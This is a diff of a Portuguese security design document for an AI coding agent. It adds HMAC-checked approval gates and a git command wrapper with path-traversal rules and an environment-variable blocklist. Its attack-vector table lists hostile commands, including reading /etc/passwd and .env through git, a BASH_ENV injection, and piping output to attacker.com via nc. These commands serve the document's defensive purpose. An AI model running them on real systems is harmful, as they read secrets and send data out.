@@ -1,8 +1,8 @@
 # GreenForge Agent — 05: Governança e Segurança
 
-> **Status:** ✅ | **Versão:** 2.2 | **Data:** 2026-05-13
+> **Status:** ✅ | **Versão:** 2.3 | **Data:** 2026-05-15
 
-### 📋 Changelog v2.1.1 → v2.2
+### 📋 Changelog v2.2 → v2.3 — Hardening Crítico de Segurança Terminal
 | Vuln | Correção |
 |---|---|
 | #9 | CostGuardrail por papel: Árbitro ≤ 20% do perTaskBudgetTokens |
@@ -98,12 +98,13 @@ Independente do `APPROVAL_MODE`, as operações abaixo sempre pausam para aprova
 | **Multi-arquivo** | Mudanças em mais de 5 arquivos simultaneamente | 🟡 MÉDIO |
 | **Testes** | Deleção ou modificação de arquivos de teste | 🟡 MÉDIO |
 
-### 2.3 ApprovalGate na UI Web
+### 2.3 ApprovalGate na UI Web — Validação com PreExecutionGuard (OCC + HMAC)
 
 O mecanismo de aprovação na IDE usa WebSocket (Socket.IO) para garantir zero race condition entre o sinal de aprovação e a continuação do debate.
 
+#### Fluxo Base (v2.2)
+
 ```typescript
-// Fluxo de aprovação via WebSocket
 // 1. Servidor emite via SSE: { type: 'HITL_GATE', gateId, payload }
 // 2. UI exibe Approval Card
 // 3. Usuário clica [APROVAR]
@@ -112,6 +113,136 @@ O mecanismo de aprovação na IDE usa WebSocket (Socket.IO) para garantir zero r
 
 // O uso de WebSocket (não HTTP POST) garante que o sinal de aprovação
 // chegue pelo mesmo canal bidirecional, sem enfileiramento HTTP.
+```
+
+#### PreExecutionGuard com Optimistic Concurrency Control (v2.3)
+
+**Problema:** O protocolo base garante zero race condition no *sinal* de aprovação, mas não valida se o *estado do servidor* quando da execução corresponde ao estado que o usuário aprovou. Se o servidor muda estado via `STEER_AGENT` entre a emissão do gate (tempo T) e a aprovação (tempo T+Δ), o usuário aprova trade-offs de T mas código é gerado baseado em T+Δ.
+
+**Solução:** Adicionar `resourceVersion` (stateHash + worktreeHash) + `epoch_id` + HMAC ao payload do gate.
+
+```typescript
+interface HITLGatePayload {
+  gateId: string;
+  payload: ApprovalCardData;
+  // Novo em v2.3:
+  stateHash: string;              // Hash SHA-256 do estado do debate em T
+  worktreeHash: string;           // Hash dos arquivos do projeto em T
+  epoch_id: number;               // Fencing token para invalidar gates pós-restart
+  gateHMAC: string;               // HMAC do payload (detecta tampering de cliente)
+}
+
+// Geração do payload (no servidor):
+function createGatePayload(
+  gateId: string,
+  data: ApprovalCardData,
+  currentState: DebateState,
+  worktreePath: string,
+  epochId: number,
+  hmacSecret: string
+): HITLGatePayload {
+  const stateHash = crypto.createHash('sha256')
+    .update(JSON.stringify(currentState)).digest('hex');
+  
+  const worktreeHash = hashWorktreeState(worktreePath);
+  
+  const payload: HITLGatePayload = {
+    gateId,
+    payload: data,
+    stateHash,
+    worktreeHash,
+    epoch_id: epochId,
+    gateHMAC: '', // Será preenchido abaixo
+  };
+  
+  // Serializa e calcula HMAC
+  const payload_str = JSON.stringify(payload);
+  payload.gateHMAC = crypto.createHmac('sha256', hmacSecret)
+    .update(payload_str).digest('hex');
+  
+  return payload;
+}
+
+// Validação no momento de resolveHITL (no servidor):
+function validateGateConsistency(
+  gate: HITLGatePayload,
+  currentState: DebateState,
+  currentEpochId: number,
+  worktreePath: string,
+  hmacSecret: string
+): { valid: boolean; reason?: string } {
+  
+  // 1. Valida epoch — gate de ciclo anterior é inválido (pós-restart)
+  if (gate.epoch_id !== currentEpochId) {
+    return { valid: false, reason: 'Gate inválido — servidor foi reinicializado' };
+  }
+  
+  // 2. Valida HMAC — detecta tampering do cliente
+  const expectedHMAC = crypto.createHmac('sha256', hmacSecret)
+    .update(JSON.stringify({ ...gate, gateHMAC: '' })).digest('hex');
+  
+  if (gate.gateHMAC !== expectedHMAC) {
+    return { valid: false, reason: 'HMAC inválido — payload foi modificado' };
+  }
+  
+  // 3. Valida state hash — detecta mutações intra-época
+  const currentStateHash = crypto.createHash('sha256')
+    .update(JSON.stringify(currentState)).digest('hex');
+  
+  if (gate.stateHash !== currentStateHash) {
+    // Estado mudou entre T (emissão) e T+Δ (aprovação)
+    // Rejeita implicitamente — UI deve recarregar e solicitar nova aprovação
+    return { 
+      valid: false, 
+      reason: `Estado do debate mudou desde a exibição do gate. Recarregue a página para reavaliar.` 
+    };
+  }
+  
+  // 4. Valida worktree hash — previne aprovação de gate baseado em artefatos desatualizados
+  const currentWorktreeHash = hashWorktreeState(worktreePath);
+  if (gate.worktreeHash !== currentWorktreeHash) {
+    return { 
+      valid: false, 
+      reason: `Arquivos do projeto foram alterados. Gate inválido — recarregue a página.` 
+    };
+  }
+  
+  return { valid: true };
+}
+
+// Integração em resolveHITL:
+async function resolveHITL(
+  gateId: string,
+  decision: 'APPROVE' | 'REJECT',
+  gate: HITLGatePayload,
+  serverState: ServerState
+): Promise<void> {
+  
+  const validation = validateGateConsistency(
+    gate,
+    serverState.currentDebateState,
+    serverState.currentEpochId,
+    serverState.worktreePath,
+    serverState.hmacSecret
+  );
+  
+  if (!validation.valid) {
+    // Rejeita aprovação com mensagem de erro clara
+    sseTransport.emitSystemAlert('GATE_VALIDATION_FAILED', {
+      gateId,
+      reason: validation.reason,
+      severity: 'WARN',
+    });
+    return;
+  }
+  
+  // Gate passou na validação — prossegue com a aprovação
+  if (decision === 'APPROVE') {
+    await continueDebate(gate.payload);
+  } else {
+    await abortDebate('Usuário rejeitou o gate');
+  }
+}
 ```
 
 ---
@@ -250,19 +381,293 @@ const SHELL_ALLOWLIST: Record<string, { allowed: string[]; blocked: string[] }> 
     blocked: ['publish', '--global', '--prefix', '--workspaces'],
   },
 };
-
-function assertCommandAllowed(commandString: string): void {
-  const ast = parse(commandString);
-  assertNoMaliciousNodes(ast); // Bloqueia CommandExpansion, ProcessSubstitution, pipes não autorizados
-  const [base, sub, ...args] = ast.commands[0];
-  const entry = SHELL_ALLOWLIST[base];
-  if (!entry) throw new SecurityError(`Binário '${base}' não está na allowlist.`);
-  if (sub && !entry.allowed.includes(sub))
-    throw new SecurityError(`Subcomando '${base} ${sub}' não permitido.`);
-  const blockedArg = args.find(a => entry.blocked.some(b => a.startsWith(b)));
-  if (blockedArg) throw new SecurityError(`Flag bloqueada: '${blockedArg}'.`);
-}
 ```
+
+#### secureGit Wrapper com AST Parsing (v2.3 — Resolução de Vulnerabilidade #4)
+
+**Problema:** O allowlist hierárquico bloqueia subcomandos globais (ex: `git config`), mas não previne path traversal dentro dos argumentos. Vetores como `git show HEAD:../../etc/passwd` e `git diff -- ../../.env` contornam a validação porque:
+1. Subcomando `show` e `diff` estão na allowlist
+2. A validação v2.2 não analisa o conteúdo dos argumentos
+3. Git interpreta paths relativos: `HEAD:../../etc/passwd` escapa do worktree
+
+**Solução:** Implementar secureGit Wrapper que:
+1. Parseia o comando shell em AST completo (via `tree-sitter` shell grammar)
+2. Valida subcomandos contra allowlist
+3. Para cada subcomando, aplica regras específicas de pathArgs
+4. Bloqueia command expansion, process substitution, e pipes não autorizados
+5. Sanitiza variáveis de ambiente antes de exec
+
+```typescript
+import * as fs from 'fs';
+import * as path from 'path';
+import { exec } from 'child_process';
+import Parser from 'tree-sitter';
+import Language from 'tree-sitter-bash';
+
+// Definir semântica de validação de paths para cada subcomando
+interface GitSubcommandPolicy {
+  allowPaths: boolean;               // Se pode aceitar argumentos path
+  pathRestriction: 'WITHIN_WORKTREE' | 'BRANCHES_ONLY' | 'NONE';
+  allowedRefPatterns: RegExp[];       // ex: /^HEAD/, /^refs\/heads\//
+  allowedPathPatterns: RegExp[];      // ex: /^[a-zA-Z0-9._\/-]+$/
+  blockedPathPatterns: RegExp[];      // ex: /^\.\.\//, /^\//, /^~\//
+}
+
+const GIT_SUBCOMMAND_POLICY: Record<string, GitSubcommandPolicy> = {
+  status: {
+    allowPaths: false,
+    pathRestriction: 'NONE',
+    allowedRefPatterns: [],
+    allowedPathPatterns: [],
+    blockedPathPatterns: []
+  },
+  diff: {
+    allowPaths: true,
+    pathRestriction: 'WITHIN_WORKTREE',
+    allowedRefPatterns: [/^HEAD$/, /^HEAD~\d+$/, /^refs\/heads\/.+/],
+    allowedPathPatterns: [/^[a-zA-Z0-9._\/-]+$/, /^\.\/[a-zA-Z0-9._\/-]+$/],
+    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//, /^~\w+\//]
+  },
+  show: {
+    allowPaths: true,
+    pathRestriction: 'BRANCHES_ONLY',  // Somente refs, não paths locais
+    allowedRefPatterns: [/^HEAD(:[^:]+)?$/, /^refs\/heads\/.+/],
+    allowedPathPatterns: [],  // show NÃO aceita paths locais, apenas refs
+    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//, /:.+\.\.\//]  // Bloqueia HEAD:../../file
+  },
+  log: {
+    allowPaths: true,
+    pathRestriction: 'BRANCHES_ONLY',
+    allowedRefPatterns: [/^HEAD$/, /^refs\/.+/, /^--all/],
+    allowedPathPatterns: [],
+    blockedPathPatterns: [/^--remotes/, /^--glob=/, /:..\//]  // Bloqueia --remotes, glob patterns
+  },
+  add: {
+    allowPaths: true,
+    pathRestriction: 'WITHIN_WORKTREE',
+    allowedRefPatterns: [],
+    allowedPathPatterns: [/^[a-zA-Z0-9._\/-]+$/, /^\.\/[a-zA-Z0-9._\/-]+$/],
+    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//]
+  },
+  commit: {
+    allowPaths: true,
+    pathRestriction: 'WITHIN_WORKTREE',
+    allowedRefPatterns: [],
+    allowedPathPatterns: [/^[a-zA-Z0-9._\/-]+$/, /^\.\/[a-zA-Z0-9._\/-]+$/],
+    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//]
+  },
+  checkout: {
+    allowPaths: true,
+    pathRestriction: 'BRANCHES_ONLY',
+    allowedRefPatterns: [/^HEAD~\d+$/, /^refs\/heads\/.+/, /^[a-zA-Z0-9_-]+$/],  // Branch names only
+    allowedPathPatterns: [/^[a-zA-Z0-9._\/-]+$/],  // Paths local OK
+    blockedPathPatterns: [/^\.\.\//, /^\//, /^~\//]
+  },
+};
+
+// Parser AST via tree-sitter
+const parser = new Parser();
+parser.setLanguage(Language);
+
+function parseShellCommand(cmdStr: string) {
+  const tree = parser.parse(cmdStr);
+  return tree.rootNode;
+}
+
+// Validação de AST com tree-sitter
+function validateGitCommand(cmdStr: string, worktreePath: string): boolean {
+  try {
+    const ast = parseShellCommand(cmdStr);
+    
+    // Bloqueia command expansion, process substitution, pipes
+    validateASTNodeSafety(ast);
+    
+    // Extrai comando e subcomando
+    const [gitBinary, subcommand, ...args] = extractCommandParts(ast);
+    
+    if (gitBinary !== 'git') {
+      throw new Error(`Esperava 'git', recebeu '${gitBinary}'`);
+    }
+    
+    if (!subcommand) {
+      throw new Error('Subcomando ausente');
+    }
+    
+    const policy = GIT_SUBCOMMAND_POLICY[subcommand];
+    if (!policy) {
+      throw new Error(`Subcomando '${subcommand}' não permitido`);
+    }
+    
+    // Valida argumentos de path conforme a política
+    if (policy.allowPaths) {
+      for (const arg of args) {
+        if (arg.startsWith('-')) continue;  // Skip flags
+        
+        // Valida contra padrões bloqueados
+        for (const blocked of policy.blockedPathPatterns) {
+          if (blocked.test(arg)) {
+            throw new Error(
+              `Path bloqueado para 'git ${subcommand}': '${arg}' corresponde ${blocked.toString()}`
+            );
+          }
+        }
+        
+        // Valida contra padrões permitidos (se houver)
+        if (policy.allowedPathPatterns.length > 0) {
+          const matches = policy.allowedPathPatterns.some(p => p.test(arg));
+          if (!matches) {
+            throw new Error(
+              `Path não permitido para 'git ${subcommand}': '${arg}'`
+            );
+          }
+        }
+        
+        // Para restriction WITHIN_WORKTREE, resolve path e valida
+        if (policy.pathRestriction === 'WITHIN_WORKTREE') {
+          const resolved = path.resolve(worktreePath, arg);
+          if (!resolved.startsWith(path.resolve(worktreePath) + path.sep)) {
+            throw new Error(
+              `Path escapa do worktree: '${arg}' → '${resolved}'`
+            );
+          }
+        }
+      }
+    }
+    
+    return true;
+  } catch (err) {
+    console.error(`[secureGit] Validação falhou: ${(err as Error).message}`);
+    return false;
+  }
+}
+
+// Detecta nós perigosos no AST
+function validateASTNodeSafety(node: any): void {
+  // Bloqueia CommandExpansion ($(...)  ou `...`)
+  if (node.type === 'command_substitution') {
+    throw new Error('Command expansion não permitida');
+  }
+  
+  // Bloqueia ProcessSubstitution (<(...) ou >(...)
+  if (node.type === 'process_substitution') {
+    throw new Error('Process substitution não permitida');
+  }
+  
+  // Bloqueia pipes (|, |&)
+  if (node.type === 'pipeline') {
+    throw new Error('Pipes não permitidas');
+  }
+  
+  // Bloqueia background execution (&)
+  if (node.type === 'background') {
+    throw new Error('Background execution não permitida');
+  }
+  
+  // Recursivamente valida filhos
+  for (const child of node.children ?? []) {
+    validateASTNodeSafety(child);
+  }
+}
+
+// Extrai [binary, subcomando, ...args] do AST
+function extractCommandParts(node: any): string[] {
+  const parts: string[] = [];
+  
+  function traverse(n: any) {
+    if (n.type === 'simple_command' || n.type === 'command') {
+      for (const child of n.children ?? []) {
+        if (child.type === 'command_name' || child.type === 'word') {
+          parts.push(child.text);
+        }
+      }
+    } else {
+      for (const child of n.children ?? []) {
+        traverse(child);
+      }
+    }
+  }
+  
+  traverse(node);
+  return parts;
+}
+
+// Sanitização de Variáveis de Ambiente
+const ENV_BLOCKLIST = [
+  'BASH_ENV', 'ENV', 'LD_PRELOAD', 'LD_LIBRARY_PATH',
+  'DYLD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES',
+  'IFS', 'CDPATH', 'PS1', 'PS2',
+  'HISTFILE', 'HISTCONTROL',
+  'MANPATH', 'INFOPATH',
+];
+
+function sanitizeEnv(): NodeJS.ProcessEnv {
+  const cleanEnv: NodeJS.ProcessEnv = {};
+  const allowlist = ['PATH', 'HOME', 'USER', 'NODE_ENV', 'TERM', 'LANG'];
+  
+  for (const key of allowlist) {
+    if (process.env[key]) {
+      cleanEnv[key] = process.env[key];
+    }
+  }
+  
+  // Remove todos os blocklist vars explicitamente
+  for (const blocked of ENV_BLOCKLIST) {
+    delete cleanEnv[blocked];
+  }
+  
+  return cleanEnv;
+}
+
+// Wrapper final
+async function executeSecureGit(
+  cmdStr: string,
+  worktreePath: string
+): Promise<string> {
+  // 1. Valida AST + allowlist
+  if (!validateGitCommand(cmdStr, worktreePath)) {
+    throw new Error(`[secureGit] Comando bloqueado: ${cmdStr}`);
+  }
+  
+  // 2. Sanitiza ambiente
+  const cleanEnv = sanitizeEnv();
+  
+  // 3. Executa com umask restritivo
+  const oldUmask = process.umask(0o077);  // rwx------ permissions only
+  
+  try {
+    return new Promise((resolve, reject) => {
+      exec(cmdStr, {
+        cwd: worktreePath,
+        env: cleanEnv,
+        timeout: 30000,  // 30s timeout
+        maxBuffer: 1024 * 1024,  // 1MB stdout max
+      }, (error, stdout, stderr) => {
+        if (error) {
+          reject(new Error(`[secureGit] Execução falhou: ${stderr}`));
+        } else {
+          resolve(stdout);
+        }
+      });
+    });
+  } finally {
+    process.umask(oldUmask);
+  }
+}
+
+// Export para uso em debug, state mutation, PTY executions
+export { executeSecureGit, validateGitCommand };
+```
+
+#### Impacto de Segurança (v2.3)
+
+| Vetor de Ataque | v2.2 | v2.3 | Validação |
+|---|---|---|---|
+| `git show HEAD:../../etc/passwd` | ❌ Passa allowlist | ✅ Bloqueado | AST parsing + regex `:..\//` |
+| `git log --remotes` | ❌ Passa allowlist | ✅ Bloqueado | Regex `/^--remotes/` em policy |
+| `git diff -- ../../.env` | ❌ Passa allowlist | ✅ Bloqueado | Path traversal detection |
+| `git config --global core.hooksPath` | ❌ Passa allowlist | ✅ Bloqueado | Subcomando `config` removido |
+| `BASH_ENV=/tmp/evil.sh git add` | ❌ Executa | ✅ Bloqueado | Sanitização de ENV |
+| `git status \| nc attacker.com` | ❌ Passa allowlist | ✅ Bloqueado | AST bloqueia pipes |
 
 ---
 
